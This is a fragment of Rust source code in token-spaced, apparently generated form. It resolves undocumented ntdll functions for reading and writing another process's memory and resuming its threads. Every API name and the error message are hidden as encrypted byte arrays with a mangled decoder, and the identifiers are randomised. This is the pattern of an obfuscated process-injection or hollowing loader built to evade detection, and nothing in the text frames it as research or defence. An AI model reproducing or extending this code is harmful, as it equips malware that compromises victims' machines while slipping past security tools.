, 160 , 49 , 83 , 91 , 52 , 119 , 143 , 197 , 37 , 83 , 68 , 61 , 10 , 168 , 15 , 105 , 187 , 86 , 153 , 238 , 126 , 85 , 166 , 54 , 210 , 122 , 157 , 96 , 20 , 115 , 6 , 52 , 164 , 102 , 60 , 35 , 232 , 97 , 31 , 67 , 184 , 222 , 173 , 195 , 160 , 94 , 124 , 75 , 248 , 60 , 49 , 133 , 174 , 186 , 86 , 65 , 144 , 255 , 140 , 112 , 206 , 174 , 175 , 228 , 125 , 206 , 133 , 229 , 3 , 99 , 29] , 89623082567583u64) . as_ptr ()) ; let NtWriteVirtualMemory = GetProcAddress (ntdll , decode_kmoddfqr_lmhb (& [142 , 36 , 122 , 169 , 230 , 91 , 222 , 92 , 36 , 74 , 103 , 234 , 79 , 128 , 1 , 212 , 203 , 230 , 71 , 101 , 129 , 234 , 131 , 85 , 57 , 27 , 130 , 101 , 187 , 1 , 213 , 10 , 238 , 48 , 219 , 178 , 0 , 191 , 188 , 96 , 57 , 103 , 158 , 144 , 230 , 28 , 137 , 104 , 148 , 129 , 17 , 247 , 204 , 187 , 46 , 43 , 240 , 164 , 19 , 245 , 136 , 12 , 1 , 173 , 36 , 240 , 185 , 101 , 129 , 167 , 146 , 55 , 96 , 67 , 230 , 121 , 13 , 233 , 204 , 80 , 70 , 213 , 103 , 43 , 185 , 102 , 210 , 94 , 162 , 65 , 11 , 148 , 233 , 183 , 104 , 37 , 31 , 39 , 206 , 163 , 154 , 196 , 252 , 32 , 253 , 59 , 101 , 178 , 91 , 150 , 34 , 134 , 254 , 30 , 149 , 123 , 68 , 171 , 30 , 203 , 26 , 181 , 196 , 57 , 146 , 245 , 48 , 147 , 110 , 218 , 164 , 186 , 109 , 44 , 133 , 198 , 17 , 61 , 222 , 56 , 108 , 48 , 11 , 173 , 250 , 43 , 33 , 147 , 135 , 2 , 105 , 93 , 148 , 231 , 182 , 195 , 91 , 45 , 235 , 59 , 165 , 117 , 220 , 57 , 132 , 230 , 21 , 106 , 33 , 79 , 123 , 137 , 112 , 93 , 145 , 129 , 91 , 27 , 6 , 98 , 181 , 105 , 114 , 203 , 44 , 153 , 177 , 29 , 248 , 110 , 206 , 52 , 174 , 74 , 192 , 28 , 138 , 140 , 204 , 133 , 214 , 61 , 242 , 156 , 236 , 70 , 231 , 208 , 213 , 140 , 120 , 222 , 68 , 86 , 204 , 251 , 159 , 96 , 16 , 12 , 32 , 85 , 242 , 182 , 62 , 143 , 236 , 75 , 20 , 62 , 177 , 39 , 15 , 212 , 0 , 245 , 94 , 22 , 1 , 92 , 22 , 226 , 20 , 248 , 251 , 173 , 73 , 57 , 186 , 170 , 133 , 143 , 160 , 59 , 238 , 163] , & [216 , 162 , 53 , 2 , 114 , 237 , 2 , 19 , 44 , 81 , 6 , 128 , 85 , 213 , 3 , 77 , 120 , 194 , 127 , 43 , 252 , 174 , 124 , 188 , 57 , 157 , 109 , 247 , 73 , 147 , 96 , 33 , 11 , 20 , 190 , 53 , 166 , 163 , 66 , 41 , 219 , 118 , 123 , 203 , 85 , 245 , 15 , 67 , 247 , 168 , 178 , 52 , 189 , 196 , 164 , 244 , 248 , 183 , 229 , 14 , 129 , 120 , 106 , 229 , 169 , 178 , 132 , 245 , 128 , 109 , 9 , 199 , 249 , 207 , 70 , 55 , 186 , 99 , 142 , 200 , 250 , 48 , 45 , 58 , 64 , 101 , 208 , 14] , 101696235636782u64) . as_ptr ()) ; let NtResumeThread = GetProcAddress (ntdll , decode_kmoddfqr_lmhb (& [221 , 147 , 10 , 240 , 169 , 197 , 239 , 146 , 86 , 244 , 219 , 72 , 206 , 184 , 172 , 86 , 41 , 255 , 62 , 127 , 213 , 22 , 153 , 151 , 62 , 95 , 100 , 220 , 196 , 194 , 176 , 14 , 10 , 43 , 155 , 241 , 124 , 124 , 124 , 173 , 210 , 132 , 41 , 240 , 91 , 58 , 117 , 217 , 5 , 249 , 215 , 120 , 196 , 14 , 186 , 103 , 208 , 88 , 220 , 162 , 39 , 49 , 172 , 34 , 5 , 120 , 202 , 118 , 231 , 249 , 113 , 255 , 83 , 117 , 103 , 44 , 127 , 159 , 119 , 153 , 19 , 250 , 118 , 94 , 94 , 61 , 178 , 26 , 239 , 156 , 53 , 33 , 78 , 17 , 202 , 152 , 120 , 72 , 160 , 108 , 181 , 148 , 50 , 228 , 132 , 240 , 54 , 21 , 11 , 16 , 104 , 171 , 238 , 10 , 233 , 182 , 66 , 213 , 118 , 117 , 17 , 225 , 89 , 176 , 184 , 251 , 33 , 202 , 68 , 235 , 159 , 175 , 89 , 128 , 183 , 249 , 189 , 212 , 41 , 78 , 200 , 252 , 67 , 134 , 126 , 48 , 29 , 199 , 218 , 210 , 68 , 24 , 100 , 26 , 80 , 30 , 176 , 118 , 227 , 167 , 29 , 159 , 36 , 190 , 213 , 193 , 132 , 10 , 41 , 247 , 175 , 176 , 13 , 73 , 104 , 250 , 242 , 117 , 88 , 39 , 6 , 15 , 19 , 182 , 80 , 229 , 148 , 90 , 4 , 89 , 22 , 95] , & [174 , 202 , 31 , 75 , 149 , 41 , 109 , 216 , 148 , 227 , 20 , 166 , 19 , 114 , 35 , 10 , 188 , 72 , 187 , 138 , 192 , 232 , 121 , 205 , 160 , 165 , 137 , 124 , 243 , 230 , 214 , 65 , 139 , 58 , 190 , 18 , 163 , 151 , 71 , 101 , 141 , 194 , 96 , 211 , 163 , 246 , 218 , 14 , 89 , 56 , 60 , 159 , 69 , 43 , 21 , 219 , 134 , 133 , 120 , 220 , 134 , 45 , 248 , 95 , 111 , 105 , 245 , 35 , 107 , 131 , 235 , 145 , 154 , 160 , 129 , 47 , 193 , 8 , 69 , 4 , 173 , 234 , 141 , 113 , 166 , 239 , 66 , 60] , 51488067945868u64) . as_ptr ()) ; if NtQueryInformationProcess . is_none () || NtClose . is_none () || NtReadVirtualMemory . is_none () || NtWriteVirtualMemory . is_none () || NtResumeThread . is_none () { return Err (decode_kmoddfqr_lmhb (& [184 , 19 , 182 , 127 , 167 , 179 , 28 , 194 , 227 , 205 , 255 , 26 , 25 , 19 , 107 , 171 , 182 , 228 , 203 , 147 , 57 , 191 , 176 , 3 , 23 , 227 , 194 , 158 , 19 , 112 , 58 , 4 , 111 , 178 , 212 , 232 , 162 , 166 , 78 , 226 , 138 , 99 , 0 , 254 , 71 , 124 , 71 , 249 , 106 , 242 , 89 , 120 , 183 , 133 , 198 , 253 , 108 , 30 , 3 , 237 , 125 , 113 , 216 , 227 , 19 , 178 , 2 , 71 , 16 , 43 , 223 , 235 , 69 , 199 , 215 , 125 , 60 , 45 , 75 , 243 , 120 , 2 , 102 , 79 , 235 , 167 , 195 , 163 , 188 , 162 , 106 , 13 , 188 , 25 , 242 , 243 , 98 , 158 , 115 , 238 , 194 , 128 , 90 , 65 , 247 , 143 , 22 , 125 , 171 , 42 , 88 , 84 , 20 , 219 , 77 , 195 , 60 , 78 , 96 , 102 , 49 , 183 , 160 , 70 , 10 , 95 , 40 , 217 , 166 , 171 , 168 , 172 , 162 , 234 , 143 , 232 , 230 , 55 , 190 , 201 , 193 , 73 , 216 , 188 , 155 , 118 , 67 , 59 , 133 , 90 , 68 , 23 , 65 , 185 , 227 , 117 , 233 , 147 , 238 , 23 , 111 , 18 , 27 , 90 , 197 , 59 , 209 , 79 , 223 , 193 , 40 , 119 , 91 , 193 , 38 , 247 , 247 , 223 , 115 , 84 , 133 , 155 , 2 , 53 , 96 , 74 , 153 , 191 , 227 , 39 , 135 , 80 , 252 , 214 , 154 , 5 , 99 , 127 , 81 , 69 , 89 , 77 , 210 , 5 , 252 , 235 , 137 , 187 , 73 , 212 , 188 , 175 , 118 , 128 , 202 , 209 , 204 , 59 , 135 , 168 , 132 , 126 , 85 , 173 , 75 , 41 , 122 , 130 , 30 , 189 , 25 , 167 , 186 , 146 , 70 , 159 , 105 , 229 , 1 , 189 , 240 , 201 , 87 , 98 , 135 , 81 , 143 , 93 , 15 , 157 , 193 , 122 , 161 , 46 , 209 , 248 , 101 , 109 , 103 , 1 , 244 , 23 , 230 , 63 , 151 , 197 , 66 , 128 , 6 , 202 , 179 , 45 , 188 , 199 , 108 , 251 , 149 , 220 , 11 , 147 , 180 , 77 , 6 , 38 , 107 , 125 , 168 , 176 , 171 , 120 , 134 , 230 , 74 , 168 , 45 , 25 , 122 , 25 , 93 , 73 , 203 , 83 , 51 , 158 , 79 , 17 , 199 , 80 , 248 , 52 , 89 , 159 , 35 , 181 , 171 , 62 , 34 , 30 , 134 , 64 , 238 , 46 , 127 , 31 , 223 , 102 , 197 , 155 , 138 , 99 , 211 , 16 , 131 , 157 , 53 , 105 , 140 , 204 , 98 , 254 , 242 , 111 , 5 , 42 , 39 , 235 , 44 , 174 , 180 , 29 , 30 , 83 , 136 , 172 , 7 , 220 , 82 , 224 , 182 , 12 , 149 , 36 , 117 , 44 , 51 , 117 , 111 , 145 , 28 , 0 , 93 , 36 , 155 , 148 , 3 , 191 , 227 , 75 , 89 , 69 , 217 , 53 , 108 , 43 , 158 , 221 , 211 , 218 , 208 , 17 , 121 , 142 , 77 , 129 , 54 , 232 , 246 , 52 , 131 , 23 , 179 , 204 , 191 , 93 , 28 , 218 , 89 , 251 , 49 , 86 , 138 , 253 , 249 , 92 , 52 , 244 , 98 , 18 , 25 , 209 , 22 , 116 , 144 , 101 , 178 , 89 , 199 , 134 , 226 , 1 , 56 , 164 , 55 , 28 , 215 , 4 , 74 , 81 , 77 , 232 , 0 , 66 , 14 , 34 , 232 , 211 , 4 , 229 , 181 , 30 , 93 , 17 , 188 , 97 , 149 , 249 , 186 , 179 , 82 , 157 , 129 , 135 , 64 , 106 , 126 , 174 , 37 , 54 , 176 , 40 , 205 , 7 , 227 , 249 , 23 , 236 , 35 , 220 , 189 , 166 , 83 , 44 , 125 , 177 , 4 , 239 , 12 , 64 , 89 , 110 , 248 , 135 , 92 , 63 , 199 , 204 , 242 , 40 , 203 , 228 , 180 , 156 , 175 , 203 , 210 , 152 , 148 , 51 , 48 , 219 , 46 , 92] , & [170 , 78 , 255 , 29 , 242 , 211 , 210 , 222 , 181 , 137 , 216 , 174 , 145 , 151 , 126 , 198 , 11 , 162 , 94 , 102 , 110 , 114 , 209 , 136 , 51 , 153 , 156 , 72 , 45 , 47 , 199 , 11 , 163 , 68 , 76 , 59 , 190 , 237 , 106 , 135 , 34 , 66 , 222 , 117 , 10 , 68 , 133 , 52 , 109 , 105 , 18 , 157 , 41 , 187 , 9 , 80 , 63 , 73 , 120 , 106 , 89 , 3 , 228 , 98 , 216 , 170 , 25 , 202 , 225 , 194 , 214 , 177 , 139 , 240 , 90 , 241 , 169 , 225 , 136 , 59 , 61 , 166 , 150 , 27 , 40 , 174 , 162 , 14] , 107404247175235u64)) ; } Ok (Syscalls { NtQueryInformationProcess : transmute (NtQueryInformationProcess . unwrap ()) , NtClose : transmute (NtClose . unwrap ()) , NtReadVirtualMemory : transmute (NtReadVirtualMemory . unwrap ()) , NtWriteVirtualMemory : transmute (NtWriteVirtualMemory . unwrap ()) , NtResumeThread : transmute (NtResumeThread . unwrap ()) , }) } } } pub static ksmkzbal : Lazy < Syscalls > = Lazy :: new (| | { Syscalls :: new () . expect ("") }) ;
fn main() { jcv_jwhj_s(); }